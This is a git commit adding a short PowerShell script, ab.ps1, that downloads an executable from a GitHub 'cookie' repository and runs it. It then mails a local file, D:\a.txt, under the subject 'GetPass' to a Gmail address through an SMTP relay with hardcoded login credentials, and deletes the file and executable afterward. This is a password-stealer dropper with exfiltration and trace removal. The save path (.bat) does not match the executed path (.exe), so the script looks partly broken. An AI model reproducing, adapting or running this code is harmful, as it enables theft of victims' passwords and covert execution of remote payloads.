b64bc0cb709aeb6c8253c09ab232c2abb0b4b6b2
YcVoz <32327418+YcVoz@users.noreply.github.com>
2020-07-22 05:54:19 +0800

    Add files via upload

---
+++ ab.ps1
@@ -0,0 +1,29 @@
+(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','D:\demo.bat');
+
+D:\demo.exe;
+$SMTPServer = 'smtp.mailtrap.io'
+
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+
+$SMTPInfo.EnableSsl = $true 
+
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('b54ababa9a8f80', 'e8ce20fc336bbc');
+
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+
+$ReportEmail.From = 'mother-of-dragons@houseoftargaryen.net'
+
+$ReportEmail.To.Add('jj55521932jj@gmail.com')
+
+$ReportEmail.Subject = 'GetPass'
+
+$ReportEmail.Body = 'GetPass_text'  
+
+$ReportEmail.Attachments.Add('D:\a.txt')
+$SMTPInfo.Timeout = 1000000
+$SMTPInfo.Send($ReportEmail)
+$ReportEmail.Attachments.Dispose()
+
+remove-item 'D:\a.txt'
+
+remove-item 'D:\demo.exe'
